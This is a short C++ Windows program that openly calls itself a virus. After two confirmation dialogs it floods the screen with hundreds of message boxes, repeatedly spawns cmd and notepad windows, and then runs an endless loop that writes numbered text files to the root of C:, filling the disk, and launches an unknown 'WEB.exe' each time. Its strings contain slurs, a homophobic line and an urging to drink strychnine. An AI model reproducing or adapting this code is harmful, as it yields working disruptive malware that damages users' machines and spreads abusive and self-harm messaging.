#include <iostream>
#include <windows.h>
#include <stdio.h>
#include <direct.h>
#include <fstream>
#include <string>
using namespace std;
int main() {
	long i = 0;
	if (MessageBoxA(NULL, "THIS CODE IS A VIRUS, IF SOMEBODY SENT YOU THIS WITHOUT TELLING YOU, YOU NEED TO HAVE A WORD WITH THEM, DO YOU WANT TO RUN THIS?", "YOUR DEMISE", MB_YESNO | MB_ICONWARNING) != IDYES ||
MessageBoxA(NULL, "I AM WARNING YOU!!!!!\r\n\r\n\
I AM NOT RESPONSIBLE FOR ANY DAMAGE CAUSED TO THIS MACHINE, EXECUTE?", "STRYCHNINE", MB_YESNO | MB_ICONWARNING) != IDYES) {
		ExitProcess(0);
	}
	for (int i = 0; i < 250; i++) {
		MessageBoxA(NULL, "I AM A RETARD!!!!", "YOUR DEMISE", MB_YESNO);
		
	}
	for (int i = 0; i < 100; i++) {
		system("mkdir YOUR DEMISE");
		system("ECHO HAHAHAHAHA I LIKE GAY MEN!");
		system("start cmd");
		system("start notepad");
		system("echo COULD NOT DELETE SYSTEM32, INVALID PERMISSIONS");
		

	}
	MessageBoxA(NULL, "Having fun?", "PEDOPHILE TRACKER", MB_YESNO);
	const char* path = "c:\\";
	string content = "GO DRINK STRYCHNINE TO FIX YOUR PROBLEMS! 0x0";
	_mkdir(path);
	while (true) {
		i++;
		ofstream file;
		file.open(path + to_string(i) + ".txt", ios_base::out);
		file << content;
		file.close();
		cout << "YOUR DEMISE IS COMING TO YOU: " + to_string(i) + "\r\n";
		system("WEB.exe");
		MessageBoxA(NULL, "I will add more updates to this soon!", "updates", MB_YESNO);

	}

}
